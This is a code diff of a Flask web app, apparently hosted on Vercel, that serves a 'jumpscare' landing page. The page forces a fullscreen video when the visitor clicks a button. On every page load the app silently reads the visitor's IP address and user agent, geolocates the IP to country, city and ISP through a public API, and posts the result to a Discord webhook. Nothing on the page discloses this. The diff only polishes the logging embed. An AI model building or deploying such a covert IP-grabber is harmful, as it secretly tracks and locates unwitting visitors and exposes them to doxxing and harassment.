@@ -1,5 +1,5 @@
 # api/index.py
-# FINAL VERSION - Enhanced IP logging and new jumpscare video.
+# FINAL VERSION - Fixed server error and redesigned Discord log embed.
 
 import os
 import re
@@ -201,51 +201,44 @@ def log_to_discord(ip, user_agent):
     if not DISCORD_WEBHOOK_URL:
         return
     
-    # --- NEW: Geolocation lookup ---
     geo_info = {}
     try:
-        # Using a free, no-key-required geolocation API
-        geo_res = httpx.get(f"http://ip-api.com/json/{ip}", timeout=5)
+        import requests
+        geo_res = requests.get(f"http://ip-api.com/json/{ip}", timeout=3)
         if geo_res.status_code == 200:
             geo_data = geo_res.json()
-            geo_info['Country'] = geo_data.get('country', 'N/A')
-            geo_info['Region'] = geo_data.get('regionName', 'N/A')
+            geo_info['Country'] = f":flag_{geo_data.get('countryCode', '').lower()}: {geo_data.get('country', 'N/A')}"
             geo_info['City'] = geo_data.get('city', 'N/A')
             geo_info['ISP'] = geo_data.get('isp', 'N/A')
-    except Exception as e:
-        print(f"Geolocation lookup failed: {e}")
-        geo_info['Error'] = 'Could not retrieve location'
+    except Exception:
+        geo_info['Error'] = 'Geolocation lookup failed'
 
-    # --- Build Rich Embed for Discord ---
     embed = {
-        "title": "Vercel Site Visitor",
-        "color": 15158332, # Red
+        "title": "👁️ Vercel Site Visitor",
+        "color": 3447003, # Blue
+        "description": f"A new visitor has accessed the landing page.",
         "fields": [
-            {"name": "IP Address", "value": f"`{ip}`", "inline": True},
-            {"name": "Country", "value": geo_info.get('Country', 'N/A'), "inline": True},
-            {"name": "City / Region", "value": f"{geo_info.get('City', 'N/A')}, {geo_info.get('Region', 'N/A')}", "inline": False},
-            {"name": "ISP", "value": geo_info.get('ISP', 'N/A'), "inline": False},
-            {"name": "User Agent", "value": f"```{user_agent}```"}
+            {"name": "🌐 IP Address", "value": f"`{ip}`", "inline": True},
+            {"name": "🌍 Country", "value": geo_info.get('Country', 'N/A'), "inline": True},
+            {"name": "🏙️ City", "value": geo_info.get('City', 'N/A'), "inline": True},
+            {"name": "🏢 ISP", "value": geo_info.get('ISP', 'N/A'), "inline": False},
+            {"name": "🖥️ User Agent", "value": f"```{user_agent}```"}
         ],
         "footer": {"text": f"Timestamp: {time.ctime()}"}
     }
 
     data = {"embeds": [embed]}
     try:
-        import requests
         requests.post(DISCORD_WEBHOOK_URL, json=data, timeout=5)
     except Exception as e:
         print(f"Failed to log to Discord: {e}")
 
 @app.route('/', methods=['GET'])
 def health_check_and_scare():
-    # --- IP Logging ---
     ip_address = request.headers.get('X-Vercel-Forwarded-For', request.remote_addr)
     user_agent = request.headers.get('User-Agent', 'Unknown')
-    # Run logging in a background thread to not delay the page load
     threading.Thread(target=log_to_discord, args=(ip_address, user_agent)).start()
 
-    # --- Jumpscare HTML with Video and Looping Audio ---
     html_content = """
     <!DOCTYPE html>
     <html lang="en">
@@ -274,18 +267,15 @@ def health_check_and_scare():
             const enterButton = document.getElementById('enter-btn');
             const scareContainer = document.getElementById('scare');
             const scareVideo = document.getElementById('scare-video');
-            
             enterButton.addEventListener('click', () => {
                 document.getElementById('container').style.display = 'none';
                 scareContainer.style.display = 'block';
-                
                 scareVideo.muted = false;
-                scareVideo.play();
-                
+                scareVideo.play().catch(e => console.error("Autoplay failed:", e));
                 try {
                     if (scareContainer.requestFullscreen) {
                         scareContainer.requestFullscreen();
-                    } else if (scareContainer.webkitRequestFullscreen) { /* Safari */
+                    } else if (scareContainer.webkitRequestFullscreen) {
                         scareContainer.webkitRequestFullscreen();
                     }
                 } catch (e) {
